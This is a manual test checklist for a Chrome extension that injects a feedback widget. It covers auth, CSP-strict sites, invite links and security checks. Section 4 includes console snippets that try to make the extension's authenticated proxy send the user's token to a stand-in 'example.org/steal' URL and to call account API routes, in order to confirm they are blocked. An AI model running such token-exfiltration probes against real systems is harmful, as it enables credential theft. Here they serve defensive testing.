# PinSay Extension — Manual E2E Checklist (load-unpacked, real Chrome)

The extension can't be exercised headlessly — run this in a real Chrome/Chromium once. It covers the
happy path **and** the security fixes from the GLM review (token isolation, allowlist, CSP scope).

## 0. Build & load
```bash
cd extension && npm install && npm run build      # → extension/dist  (Node >= 22 / node@26)
```
Chrome → `chrome://extensions` → enable **Developer mode** → **Load unpacked** → select `extension/dist`.
There is no server setting: the extension always talks to `https://app.pinsay.dev`.

> Prereq: the target project must exist in the dashboard (projects are dashboard-managed now — an
> unknown key makes the widget hide silently). Use a real project key you own, e.g. from a demo/tenant.

## 1. Auth once (token isolation)
- [ ] Click the toolbar icon → sign in with a PinSay account. Popup shows your name.
- [ ] **Security:** DevTools → Application → Storage. Confirm the JWT is in the extension's
      `storage.session` (extension service-worker context) and **NOT** in any page's
      localStorage/sessionStorage/cookies.

## 2. Plain site (happy path)
- [ ] Open `https://example.com`. In the popup, enter your project key → **Activate**.
- [ ] Tab reloads; the PinSay launcher appears. You are **already logged in** (no per-site login).
- [ ] Pick an element, leave a comment, submit. It saves (no error toast).
- [ ] Confirm in the dashboard (that project's comments) the comment landed with your author identity.
- [ ] If the project has predefined prompts, the multi-select "Predefined prompts" picker shows.

## 3. CSP-strict site (the reason the extension exists)
- [ ] Open a site with a strict `connect-src`/`script-src` CSP (e.g. `https://github.com`).
- [ ] Activate → the remote `widget.js`/`widget.css` load despite the page CSP; leave a comment; it saves.
- [ ] **Security (CSP scope):** open a *second* tab to another site; confirm that tab's CSP is intact
      (only the activated tab is stripped). Deactivate (or close the tab) → re-open the site → its CSP
      is back (rule removed).

## 4. Security verifications (the GLM-fix bar)
Run these in the **activated tab's** DevTools console (page/MAIN world):

- [ ] **Token can't be exfiltrated (allowlist).** Try to drive the proxy to an attacker URL:
      ```js
      window.postMessage({source:'pinsay-ext',kind:'fetch',id:99,
        url:'https://example.org/steal',method:'GET',headers:{},body:null,auth:true},
        window.location.origin);
      ```
      Watch the Network tab of the **extension service worker** (chrome://extensions → the extension →
      "service worker" → Network). Expect **no request to example.org** (proxy returns `blocked`).
      Repeat with the `kind:'upload'` shape and a foreign URL → also blocked.
- [ ] **Only trusted-server calls carry the token.** A legitimate widget action (posting a comment)
      *does* reach `app.pinsay.dev/api/...` with `Authorization: Bearer …` (inspect in the SW
      Network tab). A call to any other origin or a non-`/api/` path is refused.
- [ ] **Account routes are refused (SEC-BUG-01, 0.8.5).** Signed in, on an active tab, in the page console:
      ```js
      addEventListener('message', e => e.data?.source === 'pinsay-ext-res' && console.log(e.data));
      for (const [id, method, path] of [[101,'GET','/api/auth/me'],[102,'POST','/api/auth/switch-workspace'],[103,'GET','/api/keys']])
        postMessage({source:'pinsay-ext',kind:'fetch',id,url:'https://app.pinsay.dev'+path,method,
          headers:{Authorization:'Bearer __pinsay_via_proxy__'},body:null,auth:true}, location.origin);
      ```
      Expect three replies with `status: 0, body: 'blocked'` and no such request in the SW Network tab. Then use the
      widget normally (list, post, reply, edit, delete, upload a screenshot, change the shortcut, commit style as
      admin): everything still works, and no proxied response body contains `eyJ` (a JWT).
- [ ] **Cross-origin frame can't read responses.** (If convenient) an embedded 3rd-party iframe adding a
      `message` listener should not receive `pinsay-ext-res` bodies (postMessage is origin-pinned now).
- [ ] **No PII in the page.** In the page console: `window.__PINSAY_CONFIG__.user` → shows at most
      `{displayName}` — **no email, no roleName**.

## 5. Lifecycle / robustness
- [ ] Deactivate from the popup → launcher gone, CSP rule removed, tab back to normal.
- [ ] Close an activated tab without deactivating → no lingering CSP rule for other tabs.
- [ ] (MV3 worker) leave the activated tab idle >30s so the service worker sleeps, then reload the tab →
      widget re-injects (pendingInject is persisted in storage.session, not lost on SW restart).

## 6. Invite link redemption (`?pinsay_invite=<token>`)

Prereq: a workspace admin creates a client invite (dashboard → invite) for a project whose AppUrl
matches the test site, and copies the magic link.

- [ ] **Auto path (permission pre-granted).** Activate any project on the site once so the
      extension holds its host permission, sign out of the extension, then open
      `https://<site>/?pinsay_invite=<token>` → the URL cleans itself (no reload, via
      `history.replaceState`), the widget injects signed in as the invited client, and the popup
      shows the client's session with the site bound to the invite's project.
- [ ] **Popup path (first visit, no permission).** Fresh profile (or the site's permission revoked),
      open the invite link, click the toolbar icon → an "Invitation link detected" panel sits above
      the email form → **Use this invitation** → allow the browser's access prompt → the popup
      closes and the widget injects signed in as the client.
- [ ] **Embedded-widget page (no double-inject).** Open the invite link on a site that embeds
      `<pinsay-feedback>` itself → the extension stays out of the way: no second widget, no CSP
      rule; the page's own widget redeems the link.
- [ ] **Expired / rotated link.** Rotate or wait out the invite, then open its old link (auto or
      popup path) → the session is unchanged and the popup path shows "This invitation link could
      not be used — it may be expired. Ask for a new invitation."
- [ ] **Re-entry while signed out.** Sign out of the extension, reopen the same invite link from
      the email → signed straight back in as the client (the last link opened wins). The signed-out
      popup shows the re-entry hint under the sign-in form.

## Known non-blockers (before Web Store, not for E2E)
- No extension icons yet (`action.default_icon` / `icons`) — add before publishing.
- No auto re-auth on 401 from the popup (MVP gap; re-open popup to re-login).
- `<all_urls>` host permission is inherent to "inject on any site"; the per-tab, user-gated activation is
  the mitigating story for Web Store review.

**If every box passes**, the extension is functionally + security verified for load-unpacked use, and the
only remaining work before public distribution is icons + a Web Store listing.
